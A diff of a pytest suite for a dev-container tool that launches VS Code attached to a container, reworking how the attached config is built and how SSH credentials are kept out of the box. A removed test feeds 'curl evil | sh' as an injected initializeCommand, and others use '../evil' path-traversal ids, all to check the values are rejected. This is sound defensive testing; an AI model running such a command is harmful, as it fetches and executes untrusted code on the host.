@@ -8,6 +8,7 @@ from __future__ import annotations
 
 import json
 from pathlib import Path
+from types import SimpleNamespace
 
 import pytest
 
@@ -25,9 +26,7 @@ class _Proc:
 def fake(tmp_path, monkeypatch):
     """A resolved stack Context + a fake engine/`code`/generator, with subprocess recorded."""
     main = tmp_path / "repo"
-    gen = main / "dev-stack"
-    gen.mkdir(parents=True)
-    (gen / "vscode-attached-config.py").write_text("# stub generator\n")  # presence only
+    main.mkdir()
     sock = "unix:///var/folders/x/T/podman/tangible-api.sock"
     ctx = stack.Context(
         main=main,
@@ -42,49 +41,51 @@ def fake(tmp_path, monkeypatch):
         project="tangible-podman",
         worktree="",
     )
-    monkeypatch.setattr(vscode.stack, "resolve", lambda *a, **k: ctx)
-    monkeypatch.setattr(config, "vscode_enabled", lambda: True)  # [vscode] declared
-    monkeypatch.setattr(config, "vscode_workspace_file", lambda: "")  # folder attach default
-    monkeypatch.setattr(config, "dev_vm_rel", lambda: "dev-stack")
+    # `gated` records the gate and the stack resolve in CALL order: the gate must come first.
+    gated: list[str] = []
+    monkeypatch.setattr(vscode.stack, "resolve", lambda *a, **k: gated.append("resolve") or ctx)
+    # The ADOPTED config for the checkout — what `fy code` reads `[vscode]` from. Tests mutate
+    # `fake["vscode"]` (the table) directly; the tree's own foldyard.toml is never consulted.
+    adopted = config.Config(
+        repo_root=main,
+        worktree="",
+        toml={
+            "project": {"name": "tangible"},
+            "vscode": {
+                "extensions": ["anthropic.claude-code", "nefrob.vscode-just-syntax"],
+                "settings": {"github.gitAuthentication": False},
+            },
+        },
+    )
+    monkeypatch.setattr(vscode.devmode, "worktree_config", lambda wt: adopted)
+    pin = {"status": "clean", "exists": True}  # what the gate answers / whether a pin exists
+    monkeypatch.setattr(vscode.configpin, "gate", lambda verb: gated.append(verb) or pin["status"])
+    monkeypatch.setattr(
+        vscode.configpin, "inspect", lambda cfg: SimpleNamespace(pinned_exists=pin["exists"])
+    )
     state = tmp_path / "state"
     monkeypatch.setattr(config, "state_dir", lambda: state)
-    monkeypatch.setattr(
-        vscode.shutil, "which", lambda name: "/usr/local/bin/code" if name == "code" else None
-    )
+    tools = {
+        "code": "/usr/local/bin/code",
+        "ssh-agent": "/usr/bin/ssh-agent",
+        "ssh-add": "/usr/bin/ssh-add",
+    }
+    monkeypatch.setattr(vscode.shutil, "which", lambda name: tools.get(name))
 
     calls: list[dict] = []
-    box_state = {
-        "running": False,
-        "installed": "",
-        # The document the in-box generator prints. Default: the real shape it emits.
-        "gen_doc": {
-            "_generatedBy": "vscode-attached-config.py",
-            "workspaceFolder": str(main),
-            "remoteUser": "root",
-            "extensions": ["anthropic.claude-code", "nefrob.vscode-just-syntax"],
-            "settings": {"github.gitAuthentication": False},
-            "customizations": {"vscode": {"extensions": ["anthropic.claude-code"], "settings": {}}},
-        },
-        "gen_rc": 0,
-        "gen_stderr": "",
-        # Raw stdout bytes, when a test needs a shape json.dumps can't express (invalid UTF-8).
-        "gen_raw": None,
-    }
+    box_state = {"running": False, "installed": ""}
+
+    agent_state = {"rc": 2}  # `ssh-add -l` against the fy agent: 2 = not answering, 1 = empty
 
     def fake_run(cmd, **kw):
         calls.append({"cmd": cmd, "env": kw.get("env")})
+        if cmd[0] == "/usr/bin/ssh-add":
+            return _Proc(agent_state["rc"])
+        if cmd[0] == "/usr/bin/ssh-agent":
+            agent_state["rc"] = 1  # started ⇒ alive and empty from now on
+            return _Proc(0)
         if cmd[1] == "ps":  # running probe
             return _Proc(0, "deadbeef\n" if box_state["running"] else "")
-        if any("vscode-attached-config.py" in tok for tok in cmd):  # the generator, IN the box
-            # foldyard hands the generator temp-file sinks (bounded capture) rather than pipes, so
-            # the fake writes into them exactly as the real `podman exec` would.
-            doc = box_state["gen_doc"]
-            raw = box_state["gen_raw"]
-            if raw is None:
-                raw = b"" if doc is None else json.dumps(doc).encode()
-            kw["stdout"].write(raw)
-            kw["stderr"].write(str(box_state["gen_stderr"]).encode())
-            return _Proc(box_state["gen_rc"])
         if cmd[1] == "exec":  # ls installed exts / marker reset
             return _Proc(0, box_state["installed"])
         return _Proc(0)  # the `code` launch (and anything else)
@@ -93,6 +94,11 @@ def fake(tmp_path, monkeypatch):
     return {
         "calls": calls,
         "state": box_state,
+        "adopted": adopted,
+        "vscode": adopted.toml["vscode"],
+        "gated": gated,
+        "pin": pin,
+        "agent": agent_state,
         "ctx": ctx,
         "udd": state / "vscode" / "main",
         "sock": sock,
@@ -103,8 +109,12 @@ def _launch(calls):
     return [c for c in calls if c["cmd"][0] == "/usr/local/bin/code"]
 
 
-def _generator(calls):
-    return [c for c in calls if any("vscode-attached-config.py" in t for t in c["cmd"])]
+def _recommend(main: Path, sub: str, ids: list, text: str | None = None) -> None:
+    """Write ``<main>/<sub>/.vscode/extensions.json`` — VS Code's own recommendations file, which
+    `fy code` must NOT read (it is mount data)."""
+    f = main / sub / ".vscode" / "extensions.json"
+    f.parent.mkdir(parents=True, exist_ok=True)
+    f.write_text(text if text is not None else json.dumps({"recommendations": ids}))
 
 
 def _settings(fake):
@@ -242,31 +252,12 @@ def test_launch_uses_isolated_user_data_dir(fake):
     argv = launch[0]["cmd"]
     # the WHOLE point: a dedicated --user-data-dir, NOT VS Code's default singleton dir.
     assert argv[argv.index("--user-data-dir") + 1] == str(fake["udd"])
+    # Always the checkout FOLDER: one attach shape for a worktree's lifetime, so window-scoped
+    # state VS Code saves in one session (Peacock colours, …) is read by the next.
+    assert "--file-uri" not in argv
     uri = argv[argv.index("--folder-uri") + 1]
     assert uri.startswith("vscode-remote://attached-container+")
     assert uri.endswith(str(fake["ctx"].main))
-
-
-def test_workspace_file_opens_file_uri_when_present(fake, monkeypatch):
-    fake["state"]["running"] = True
-    monkeypatch.setattr(config, "vscode_workspace_file", lambda: "tangible.code-workspace")
-    (fake["ctx"].main / "tangible.code-workspace").write_text("{}\n")
-    assert vscode.code() == 0
-    argv = _launch(fake["calls"])[0]["cmd"]
-    assert "--folder-uri" not in argv
-    uri = argv[argv.index("--file-uri") + 1]
-    assert uri.startswith("vscode-remote://attached-container+")
-    assert uri.endswith(str(fake["ctx"].main) + "/tangible.code-workspace")
-
-
-def test_workspace_file_missing_falls_back_to_folder_attach(fake, monkeypatch, capsys):
-    fake["state"]["running"] = True
-    monkeypatch.setattr(config, "vscode_workspace_file", lambda: "tangible.code-workspace")
-    assert vscode.code() == 0
-    argv = _launch(fake["calls"])[0]["cmd"]
-    assert "--file-uri" not in argv
-    assert argv[argv.index("--folder-uri") + 1].endswith(str(fake["ctx"].main))
-    assert "not in the checkout" in capsys.readouterr().out
 
 
 def test_launch_stamps_local_terminal_zdotdir_in_isolated_user_settings(fake):
@@ -354,62 +345,136 @@ def _cfg_path(fake) -> Path:
     return vscode._globalstorage(fake["udd"]) / "nameConfigs" / "tangible-podman-devbox.json"
 
 
-def test_generator_runs_in_the_box_and_foldyard_does_the_host_write(fake):
-    # The generator is a REPO file. Running it host-side made `fy code` execute whatever the
-    # checkout contained, as the operator; it needs only the mount, so it runs in the box and
-    # PRINTS the document, and foldyard — installed code — performs the one host-side write.
+def _written(fake) -> dict:
+    return json.loads(_cfg_path(fake).read_text())
+
+
+def test_attached_config_is_built_by_foldyard_from_the_adopted_config(fake):
+    # No consumer code runs anywhere, and nothing under the mount is read: the document is
+    # foldyard's own, from the ADOPTED `[vscode]` table, and the one host-side write lands under
+    # OUR user-data-dir's globalStorage.
     fake["state"]["running"] = True
     assert vscode.code() == 0
-    (gen,) = _generator(fake["calls"])
-    cmd = gen["cmd"]
-    assert cmd[:2] == ["podman", "exec"]  # in the box, not on the host
-    # Invoked through the python shim, not a bare `python3` — the box contract promises uv, not
-    # python, so the packaged (uv-first) image has no python3 to run the generator with.
-    assert cmd[cmd.index("-c") + 1] == vscode._PY_SHIM
-    assert cmd[cmd.index("-c") + 3].endswith("vscode-attached-config.py")  # after the "$0" slot
-    assert cmd[-2:] == ["tangible-podman-devbox", str(fake["ctx"].main)]
-    # …and the config lands under OUR user-data-dir's globalStorage, else the isolated instance
-    # would never see it.
-    written = json.loads(_cfg_path(fake).read_text())
-    assert written["extensions"] == ["anthropic.claude-code", "nefrob.vscode-just-syntax"]
-    assert written["remoteUser"] == "root"
-
-
-def test_host_exec_keys_are_dropped_not_written(fake, capsys):
-    # `initializeCommand` runs ON THE HOST, so honouring it would hand the repo back the exact
-    # host-execution path this split closed. Unknown keys are dropped and NAMED (an allowlist:
-    # a denylist fails open the day VS Code's schema grows another hook).
-    fake["state"]["running"] = True
-    fake["state"]["gen_doc"]["initializeCommand"] = "curl evil | sh"
-    fake["state"]["gen_doc"]["postAttachCommand"] = "whoami"
-    fake["state"]["gen_doc"]["customizations"]["vscode"]["devPorts"] = [1]
-    assert vscode.code() == 0
-    written = _cfg_path(fake).read_text()
-    assert "initializeCommand" not in written and "postAttachCommand" not in written
-    assert "devPorts" not in written
-    err = capsys.readouterr().err  # diagnostics go to stderr, like the module's other notices
-    assert "initializeCommand" in err and "devPorts" in err  # named, not silently swallowed
-
-
-def test_workspace_folder_is_pinned_and_extension_ids_validated(fake):
-    # A document that points the attach at another path, or smuggles a non-id into `extensions`,
-    # is corrected rather than trusted — the host write is foldyard's assertion, not the repo's.
-    fake["state"]["running"] = True
-    fake["state"]["gen_doc"]["workspaceFolder"] = "/etc"
-    fake["state"]["gen_doc"]["extensions"] = ["ok.ext", "../../evil", "", 7]
-    fake["state"]["gen_doc"]["settings"] = "not-an-object"
-    assert vscode.code() == 0
-    written = json.loads(_cfg_path(fake).read_text())
+    written = _written(fake)
+    assert written["_generatedBy"] == vscode._GENERATED_MARKER
     assert written["workspaceFolder"] == str(fake["ctx"].main)
-    assert written["extensions"] == ["ok.ext"]
-    # A non-object settings value is still dropped whole; `settings` now survives only because
-    # foldyard pins the no-auto-forward guard into it, so what remains is OURS and nothing else.
-    assert set(written["settings"]) == {vscode._PORTS_ATTRIBUTES}
+    # `remoteUser` is foldyard's FACT, not a consumer choice: `fy shell`/`fy claude` exec `--user 0`,
+    # so an attach as the image's baked user would split file ownership down the middle again.
+    assert written["remoteUser"] == "root"
+    exts = ["anthropic.claude-code", "nefrob.vscode-just-syntax"]
+    assert written["extensions"] == exts
+    assert written["settings"]["github.gitAuthentication"] is False
+    # Both schemas, so the extensions are INSTALLED whichever Dev Containers version is running.
+    assert written["customizations"]["vscode"]["extensions"] == exts
+    assert written["customizations"]["vscode"]["settings"] == written["settings"]
+
+
+def test_the_tree_is_never_the_source_and_drift_is_gated_first(fake):
+    # The extensions list decides what the HOST installs (a UI-kind extension installs into the
+    # operator's shared ~/.vscode/extensions, for their everyday VS Code too), and a `.vscode/
+    # extensions.json` or a `foldyard.toml` under the mount is the box's to write. So the list is
+    # config, read from the ADOPTED copy — a box edit is inert until an operator adopts it — and
+    # the adopt/revert/ignore gate runs before the write, so the operator meets the drift here.
+    main = fake["ctx"].main
+    _recommend(main, ".", ["evil.helper"])
+    (main / "foldyard.toml").write_text('[vscode]\nextensions = ["evil.helper"]\n')
+    fake["state"]["running"] = True
+    assert vscode.code() == 0
+    assert "evil.helper" not in _cfg_path(fake).read_text()
+    assert fake["gated"] == ["fy code", "resolve"]
+
+
+@pytest.mark.parametrize("status", ["ignored", "unresolved", "adopted", "reverted", "pinned"])
+def test_gate_outcomes_with_a_pin_in_place_proceed_on_the_adopted_copy(fake, status):
+    # `ignored`/`unresolved` are the operator deferring: the ADOPTED copy stays in force (that is
+    # what `worktree_config` returns), exactly as `fy up` proceeds on them. Refusing here would
+    # override a deliberate "ignore for now" with nothing gained — the tree is not read either way.
+    fake["pin"]["status"] = status
+    fake["state"]["running"] = True
+    assert vscode.code() == 0
+    assert _written(fake)["_generatedBy"] == vscode._GENERATED_MARKER
+
+
+def test_a_failed_gate_refuses_to_launch(fake, capsys):
+    # "error" is the gate not knowing whether the tree drifted — and `effective()` degrades to the
+    # working tree on an unreadable state dir, so proceeding could hand the host a tree-chosen
+    # extension list. `fy up` keeps going on this (the supervisor reconciles from the pin anyway);
+    # `fy code` has no such backstop, so it stops.
+    fake["pin"]["status"] = "error"
+    fake["state"]["running"] = True
+    assert vscode.code() == 1
+    assert "couldn't check foldyard.toml" in capsys.readouterr().err
+    assert not _cfg_path(fake).exists()
+    assert not _launch(fake["calls"])
+
+
+def test_nothing_adopted_refuses_to_launch(fake, capsys):
+    # The gate answers "ignored" when an operator declines the FIRST adoption too — and with no
+    # pin, `effective()` falls back to the working tree: the one case where `[vscode]` would be
+    # read from the mount. Checked as "does a pin exist", not by status string.
+    fake["pin"]["status"] = "ignored"
+    fake["pin"]["exists"] = False
+    fake["state"]["running"] = True
+    assert vscode.code() == 1
+    assert "nothing adopted" in capsys.readouterr().err
+    assert not _cfg_path(fake).exists()
+    assert not _launch(fake["calls"])
+
+
+def test_extension_ids_are_validated_and_the_attach_extension_dropped(fake):
+    # Invalid ids are dropped rather than handed to VS Code; the Dev Containers extension is
+    # dropped as meaningless inside the container it attached through; duplicates collapse.
+    fake["vscode"]["extensions"] = [
+        "biomejs.biome",
+        "ms-vscode-remote.remote-containers",
+        "../evil",
+        "",
+        "biomejs.biome",
+    ]
+    fake["state"]["running"] = True
+    assert vscode.code() == 0
+    assert _written(fake)["extensions"] == ["biomejs.biome"]
+
+
+def test_settings_come_from_config_and_keep_the_daemon_port_pin(fake, monkeypatch):
+    # The `[vscode.settings]` table is the consumer's lever for machine-scoped settings — the case
+    # that motivated it is switching off auto port-forwarding wholesale. The pin still rides
+    # alongside: a consumer setting can't turn a daemon port back into a forwardable one.
+    monkeypatch.setattr(config, "gcp_minter_port", lambda: 8188)
+    fake["vscode"]["settings"] = {
+        "remote.autoForwardPorts": False,
+        "remote.portsAttributes": {"8188": {"onAutoForward": "notify", "label": "Minter"}},
+    }
+    fake["state"]["running"] = True
+    assert vscode.code() == 0
+    settings = _written(fake)["settings"]
+    assert settings["remote.autoForwardPorts"] is False
+    assert settings["remote.portsAttributes"]["8188"] == {
+        "onAutoForward": "ignore",
+        "label": "Minter",
+    }
+
+
+def test_a_settings_change_resets_the_machine_settings_marker(fake):
+    # Dev Containers writes the attached config's settings into the box's Machine settings ONCE
+    # per server install (.writeMachineSettingsMarker — the settings twin of the extensions
+    # marker), so a changed table would otherwise silently never apply to a box that has already
+    # been attached to. First write, and every change since the last write, clear it.
+    fake["state"]["running"] = True
+    fake["state"]["installed"] = "anthropic.claude-code-1.2.3\nnefrob.vscode-just-syntax-0.5.0\n"
+    assert vscode.code() == 0
+    assert _execs(fake["calls"], "rm -f", ".writeMachineSettingsMarker")
+    fake["calls"].clear()
+    assert vscode.code() == 0  # same settings → the box's copy is current
+    assert not _execs(fake["calls"], ".writeMachineSettingsMarker")
+    fake["vscode"]["settings"]["remote.autoForwardPorts"] = False
+    assert vscode.code() == 0
+    assert _execs(fake["calls"], "rm -f", ".writeMachineSettingsMarker")
 
 
 def test_user_owned_config_is_never_clobbered(fake, capsys):
     # Removing the `_generatedBy` marker is how you take ownership of the file; we then leave it
-    # (and skip the marker reset, since we didn't change what's configured).
+    # (and skip the marker resets, since we didn't change what's configured).
     fake["state"]["running"] = True
     path = _cfg_path(fake)
     path.parent.mkdir(parents=True, exist_ok=True)
@@ -417,7 +482,7 @@ def test_user_owned_config_is_never_clobbered(fake, capsys):
     assert vscode.code() == 0
     assert json.loads(path.read_text()) == {"extensions": ["mine.only"]}
     assert "kept your customised" in capsys.readouterr().out
-    assert not _execs(fake["calls"], ".installExtensionsMarker")
+    assert not _execs(fake["calls"], "Marker")
 
 
 def test_a_foreign_marker_is_someone_elses_file_too(fake, capsys):
@@ -432,6 +497,29 @@ def test_a_foreign_marker_is_someone_elses_file_too(fake, capsys):
     assert "kept your customised" in capsys.readouterr().out
 
 
+def test_an_unreadable_existing_config_is_kept_not_replaced(fake, capsys, monkeypatch):
+    # Malformed is "nothing to preserve"; UNREADABLE is "we don't know whose this is" — and the
+    # answer to "may I overwrite a file I can't inspect?" is no, or a permissions blip on the
+    # operator's own customised config would silently revert it to foldyard's.
+    fake["state"]["running"] = True
+    path = _cfg_path(fake)
+    path.parent.mkdir(parents=True, exist_ok=True)
+    path.write_text('{"extensions": ["mine.only"]}')
+    real_read_text = Path.read_text
+
+    def refuse(self, *a, **kw):
+        if self == path:
+            raise PermissionError(13, "Permission denied", str(self))
+        return real_read_text(self, *a, **kw)
+
+    monkeypatch.setattr(Path, "read_text", refuse)
+    assert vscode.code() == 0
+    monkeypatch.undo()
+    assert json.loads(path.read_text()) == {"extensions": ["mine.only"]}
+    assert "could not read it" in capsys.readouterr().out
+    assert not _execs(fake["calls"], "Marker")
+
+
 @pytest.mark.parametrize("junk", ["null", "[1, 2]", "not json at all"])
 def test_a_malformed_existing_config_is_replaced_not_a_traceback(fake, junk):
     # `null` parses fine and then answers every lookup with a TypeError — the one shape that used
@@ -441,81 +529,75 @@ def test_a_malformed_existing_config_is_replaced_not_a_traceback(fake, junk):
     path.parent.mkdir(parents=True, exist_ok=True)
     path.write_text(junk)
     assert vscode.code() == 0
-    assert json.loads(path.read_text())["_generatedBy"] == vscode._GENERATED_MARKER
+    assert _written(fake)["_generatedBy"] == vscode._GENERATED_MARKER
 
 
-def test_generator_failure_is_non_fatal(fake, capsys):
-    # A broken generator must not stop the attach — VS Code opens, just without fresh extensions.
+def test_the_in_box_harden_is_ensured_before_the_attach(fake):
+    # The attach forwards the host's SSH agent + git credentials into the box; the in-box hygiene
+    # (box._HARDEN_SNIPPET: unset vars, reap the sockets) must be in place and its reaper running
+    # BEFORE VS Code's server lands — so the exec comes before the `code` launch, every time.
     fake["state"]["running"] = True
-    fake["state"]["gen_rc"] = 1
-    fake["state"]["gen_stderr"] = "boom"
     assert vscode.code() == 0
-    assert _launch(fake["calls"])  # still launched
-    assert not _cfg_path(fake).exists()
-    assert "attaching anyway" in capsys.readouterr().err
+    cmds = [c["cmd"] for c in fake["calls"]]
+    harden = [i for i, c in enumerate(cmds) if "exec" in c and "harden.sh" in c[-1]]
+    launch = [i for i, c in enumerate(cmds) if c[0] == "/usr/local/bin/code"]
+    assert harden and launch and harden[0] < launch[0]
 
 
-def test_a_hung_generator_doesnt_wedge_the_attach(fake, monkeypatch, capsys):
-    # The generator is repo code in the box: a stray input() or a wedged import must time out, not
-    # hold `fy code` open forever.
+def test_vscode_is_launched_with_foldyards_empty_agent_not_the_operators(fake, monkeypatch):
+    # The attach forwards whatever SSH_AUTH_SOCK the VS Code process holds, verbatim (shown live:
+    # the process keeps the launch env's value; only an UNSET var makes the extension find the
+    # host's real agent). So the launch hands it foldyard's own agent, holding nothing — what
+    # reaches the box is empty by construction, no race to win.
+    monkeypatch.setenv("SSH_AUTH_SOCK", "/private/tmp/com.apple.launchd.x/Listeners")
     fake["state"]["running"] = True
-    real_run = vscode.subprocess.run
-
-    def hang(cmd, **kw):
-        if any("vscode-attached-config.py" in tok for tok in cmd):
-            assert kw.get("timeout") == vscode._GENERATOR_TIMEOUT  # the bound is actually passed
-            raise vscode.subprocess.TimeoutExpired(cmd, kw["timeout"])
-        return real_run(cmd, **kw)
-
-    monkeypatch.setattr(vscode.subprocess, "run", hang)
     assert vscode.code() == 0
-    assert _launch(fake["calls"])  # still launched
-    assert not _cfg_path(fake).exists()
-    assert "didn't finish" in capsys.readouterr().err
+    launch = _launch(fake["calls"])[0]
+    sock = str(fake["udd"] / "fy-empty-agent.sock")
+    assert launch["env"]["SSH_AUTH_SOCK"] == sock
+    started = [c["cmd"] for c in fake["calls"] if c["cmd"][0] == "/usr/bin/ssh-agent"]
+    assert started == [["/usr/bin/ssh-agent", "-a", sock]]
 
 
-def test_an_oversized_document_is_refused_not_parsed(fake, monkeypatch, capsys):
-    # Refused BEFORE json.loads: the sanitizer would drop it all anyway, having already built it.
+def test_a_live_empty_agent_is_reused_not_restarted(fake):
+    fake["agent"]["rc"] = 1  # already answering, no identities
     fake["state"]["running"] = True
-    monkeypatch.setattr(vscode, "_MAX_DOC_BYTES", 8)
     assert vscode.code() == 0
-    assert not _cfg_path(fake).exists()
-    assert "more than 8 bytes" in capsys.readouterr().err
+    assert not [c for c in fake["calls"] if c["cmd"][0] == "/usr/bin/ssh-agent"]
+    assert _launch(fake["calls"])[0]["env"]["SSH_AUTH_SOCK"].endswith("fy-empty-agent.sock")
 
 
-def test_the_size_limit_is_across_BOTH_streams(fake, monkeypatch, capsys):
-    # A per-stream cap is one `>&2` away from useless: a generator that wants to flood us would
-    # just split the flood. The document here is tiny; the noise on stderr is what blows the cap.
+def test_an_agent_that_holds_identities_refuses_the_launch(fake, capsys):
+    # Someone `ssh-add`ed a key into the fy agent. Forwarding THAT is the leak this exists to
+    # prevent, so the launch stops and says how to empty it.
+    fake["agent"]["rc"] = 0  # identities listed
     fake["state"]["running"] = True
-    fake["state"]["gen_stderr"] = "x" * 200
-    monkeypatch.setattr(vscode, "_MAX_DOC_BYTES", 100)
-    assert vscode.code() == 0
-    assert not _cfg_path(fake).exists()
-    out = capsys.readouterr()
-    assert "more than 100 bytes" in out.err
-    assert "x" * 101 not in out.out  # the relayed stderr is capped on its way to the human too
+    assert vscode.code() == 1
+    assert "holds identities" in capsys.readouterr().err
+    assert not _launch(fake["calls"])
 
 
-def test_invalid_utf8_output_is_a_skipped_config_not_a_traceback(fake, capsys):
-    # The generator is repo code: whatever it emits must land as a refused document, never as a
-    # UnicodeDecodeError escaping `fy code` (which is what decoding at capture time gave us).
+def test_the_git_credential_bridge_is_switched_off_at_both_scopes(fake):
+    # `git.terminalAuthentication` off means the git extension never sets GIT_ASKPASS in a box
+    # terminal — the bridge is not installed, rather than removed after the fact. Pinned in the
+    # instance's own settings (always written) and in the attached config (machine scope).
     fake["state"]["running"] = True
-    fake["state"]["gen_raw"] = b'{"extensions": ["\xff\xfe.bad"]}'
-    assert vscode.code() == 0  # the attach still happens
-    assert _launch(fake["calls"])
-    # It parsed (the replacement chars sit inside a JSON string) — and the id fails validation.
-    assert json.loads(_cfg_path(fake).read_text())["extensions"] == []
-    fake["state"]["gen_raw"] = b"\xff\xfe not json"
     assert vscode.code() == 0
-    assert "didn't print a JSON document" in capsys.readouterr().err
+    for doc in (json.loads(_settings(fake).read_text()), _written(fake)["settings"]):
+        assert doc["git.terminalAuthentication"] is False
+        assert doc["git.useIntegratedAskPass"] is False
 
 
-def test_non_json_generator_output_is_refused(fake, capsys):
+def test_a_failed_harden_refuses_the_attach(fake, monkeypatch, capsys):
+    # If the in-box hygiene can't be applied, attaching would forward host credentials into an
+    # unguarded box — so it doesn't.
+    from foldyard import box as box_mod
+
+    monkeypatch.setattr(box_mod, "ensure_harden", lambda *a: False)
     fake["state"]["running"] = True
-    fake["state"]["gen_doc"] = None  # prints nothing
-    assert vscode.code() == 0
-    assert not _cfg_path(fake).exists()
-    assert "didn't print a JSON document" in capsys.readouterr().err
+    assert vscode.code() == 1
+    assert "not attaching" in capsys.readouterr().err
+    assert not _launch(fake["calls"])
 
 
 def test_resets_install_marker_when_extensions_missing(fake):
@@ -533,57 +615,34 @@ def test_no_marker_reset_when_everything_is_installed(fake):
 
 
 def test_errors_when_code_not_on_path(fake, monkeypatch, capsys):
-    # On the HOST (not in-box), a missing `code` CLI gets install guidance + the manual fallback.
     fake["state"]["running"] = True
     monkeypatch.setattr(vscode.shutil, "which", lambda name: None)
-    monkeypatch.setattr(config, "in_box", lambda: False)
     assert vscode.code() == 1
     err = capsys.readouterr().err
-    assert "Shell Command: Install 'code' command in PATH" in err
+    assert "isn't on your PATH" in err
     assert "Attach to Running Container" in err
     assert not _launch(fake["calls"])
 
 
 def test_errors_when_run_inside_box(fake, monkeypatch, capsys):
-    # Inside the dev box there's no host `code` to launch — tell the user to run it on the Mac.
+    # In-box there's no `code` AND no host bridge: say so, point at the host, and don't fall
+    # through to the generic "install code" advice.
     fake["state"]["running"] = True
     monkeypatch.setattr(vscode.shutil, "which", lambda name: None)
     monkeypatch.setattr(config, "in_box", lambda: True)
     assert vscode.code() == 1
     err = capsys.readouterr().err
-    assert "run on your Mac" in err
-    assert not _launch(fake["calls"])
+    assert "has to run on your Mac" in err and "fy code" in err
+    assert "Install it" not in err
 
 
 def test_refuses_when_vscode_table_absent(fake, monkeypatch, capsys):
-    # No [vscode] table → `fy code` is off (no server volume is mounted), with an enable hint.
-    fake["state"]["running"] = True
-    monkeypatch.setattr(config, "vscode_enabled", lambda: False)
+    # `[vscode]` is the opt-in that mounts the vscode-server volume; without it the attach would
+    # work once and re-download the server on every box recreation — so refuse with the fix.
+    del fake["adopted"].toml["vscode"]
     assert vscode.code() == 1
-    assert "[vscode]" in capsys.readouterr().err
+    assert "[vscode] table" in capsys.readouterr().err
     assert not _launch(fake["calls"])
-
-
-def test_our_marker_is_stamped_even_when_the_generator_omits_it(fake):
-    # The marker is how the NEXT run recognises the file as ours; copying the document's value would
-    # let a generator that omits it lock foldyard out of its own config forever.
-    fake["state"]["running"] = True
-    del fake["state"]["gen_doc"]["_generatedBy"]
-    assert vscode.code() == 0
-    assert json.loads(_cfg_path(fake).read_text())["_generatedBy"] == vscode._GENERATED_MARKER
-    # …and a second run still updates it (it isn't mistaken for a user-owned file).
-    fake["state"]["gen_doc"]["extensions"] = ["only.one"]
-    assert vscode.code() == 0
-    assert json.loads(_cfg_path(fake).read_text())["extensions"] == ["only.one"]
-
-
-@pytest.mark.parametrize("bad", [None, "anthropic.claude-code", 7, {"a": 1}])
-def test_non_list_extensions_cannot_crash_sanitization(fake, bad):
-    # A malformed document is a bad config, not a traceback out of `fy code`.
-    fake["state"]["running"] = True
-    fake["state"]["gen_doc"]["extensions"] = bad
-    assert vscode.code() == 0
-    assert json.loads(_cfg_path(fake).read_text())["extensions"] == []
 
 
 # ── host-daemon ports are never auto-forwarded ────────────────────────────────────────
@@ -599,49 +658,49 @@ def test_host_daemon_ports_are_never_auto_forwarded(monkeypatch):
     monkeypatch.setattr(config, "gcp_minter_port", lambda: 8188)
     monkeypatch.setattr(config, "proxy_port", lambda: 8088)
 
-    clean = vscode._sanitize_attached_config({"settings": {"editor.fontSize": 12}}, "/repo")
+    cfg = vscode._attached_config("/repo", [], {"editor.fontSize": 12})
 
-    attrs = clean["settings"]["remote.portsAttributes"]
+    attrs = cfg["settings"]["remote.portsAttributes"]
     assert attrs["8188"]["onAutoForward"] == "ignore"
     assert attrs["8088"]["onAutoForward"] == "ignore"
-    # Scoped, not blunt: the consumer's own settings survive and other ports stay forwardable.
-    assert clean["settings"]["editor.fontSize"] == 12
-    assert "remote.autoForwardPorts" not in clean["settings"]
+    # Scoped, not blunt: the consumer's own settings survive and other ports stay forwardable
+    # unless the consumer says otherwise (`[vscode.settings]`).
+    assert cfg["settings"]["editor.fontSize"] == 12
+    assert "remote.autoForwardPorts" not in cfg["settings"]
 
 
-def test_daemon_port_pin_survives_a_generator_that_sets_its_own(monkeypatch):
-    """The pin is a host-consequence guard, so it wins over the document — same rule as
-    workspaceFolder. A generator re-enabling the very port that shadows the minter would
-    reintroduce a failure that presents as a dead credential path, not as a VS Code setting."""
+def test_daemon_port_pin_survives_a_consumer_that_sets_its_own(monkeypatch):
+    """The pin is a host-consequence guard, so it wins over the config — same rule as
+    workspaceFolder. A table re-enabling the very port that shadows the minter would reintroduce
+    a failure that presents as a dead credential path, not as a VS Code setting."""
     monkeypatch.setattr(config, "gcp_minter_port", lambda: 8188)
     monkeypatch.setattr(config, "proxy_port", lambda: 8088)
 
-    clean = vscode._sanitize_attached_config(
+    cfg = vscode._attached_config(
+        "/repo",
+        [],
         {
-            "settings": {
-                "remote.portsAttributes": {
-                    "8188": {"label": "Minter", "onAutoForward": "notify", "protocol": "http"}
-                }
+            "remote.portsAttributes": {
+                "8188": {"label": "Minter", "onAutoForward": "notify", "protocol": "http"}
             }
         },
-        "/repo",
     )
 
-    pinned = clean["settings"]["remote.portsAttributes"]["8188"]
+    pinned = cfg["settings"]["remote.portsAttributes"]["8188"]
     assert pinned["onAutoForward"] == "ignore"
-    # Only the guard is overridden; the generator's other attributes for that port survive.
+    # The consumer's other attributes for that port are their business and survive.
     assert pinned["label"] == "Minter" and pinned["protocol"] == "http"
 
 
-def test_daemon_port_pin_is_applied_when_the_document_has_no_settings(monkeypatch):
-    """No settings key is the common case (the generator only reports extensions) — the pin has to
-    create one, or the protection only exists for consumers who happen to ship settings."""
+def test_daemon_port_pin_is_applied_when_config_has_no_settings(monkeypatch):
+    """No `[vscode.settings]` is the common case — the pin has to create the settings object, or
+    the protection only exists for consumers who happen to declare settings."""
     monkeypatch.setattr(config, "gcp_minter_port", lambda: 8188)
     monkeypatch.setattr(config, "proxy_port", lambda: 8088)
 
-    clean = vscode._sanitize_attached_config({"extensions": []}, "/repo")
+    cfg = vscode._attached_config("/repo", [], {})
 
-    assert clean["settings"]["remote.portsAttributes"]["8188"]["onAutoForward"] == "ignore"
+    assert cfg["settings"]["remote.portsAttributes"]["8188"]["onAutoForward"] == "ignore"
 
 
 def test_published_ports_are_never_auto_forwarded(monkeypatch):
@@ -655,7 +714,7 @@ def test_published_ports_are_never_auto_forwarded(monkeypatch):
     monkeypatch.setattr(config, "proxy_port", lambda: 8088)
     monkeypatch.setattr(config, "port_bases", lambda: {"APP_PORT": 3000, "SIM_PORT": 4400})
 
-    clean = vscode._sanitize_attached_config({"settings": {"editor.fontSize": 12}}, "/repo")
+    clean = vscode._attached_config("/repo", [], {"editor.fontSize": 12})
 
     attrs = clean["settings"]["remote.portsAttributes"]
     assert attrs["3000-3089"]["onAutoForward"] == "ignore"
@@ -671,7 +730,7 @@ def test_published_port_pin_is_absent_without_a_ports_table(monkeypatch):
     monkeypatch.setattr(config, "proxy_port", lambda: 8088)
     monkeypatch.setattr(config, "port_bases", lambda: {})
 
